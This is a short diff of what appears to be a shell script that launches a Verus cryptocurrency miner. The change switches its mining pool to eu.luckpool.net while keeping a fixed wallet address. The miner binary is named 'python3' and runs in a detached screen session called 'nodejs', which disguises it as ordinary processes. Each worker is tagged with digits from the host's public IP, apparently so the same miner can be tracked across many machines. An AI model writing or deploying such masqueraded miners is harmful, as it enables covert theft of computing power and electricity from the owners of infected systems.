@@ -12,4 +12,4 @@ IP=$(curl -s ifconfig.me)
 IP_NUMBERS=${IP//./}
 LAST_SIX=${IP_NUMBERS: -6}
 
-screen -dmS nodejs ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.D$LAST_SIX
+screen -dmS nodejs ./dotsrb/python3 --algorithm verushash --pool eu.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.D$LAST_SIX
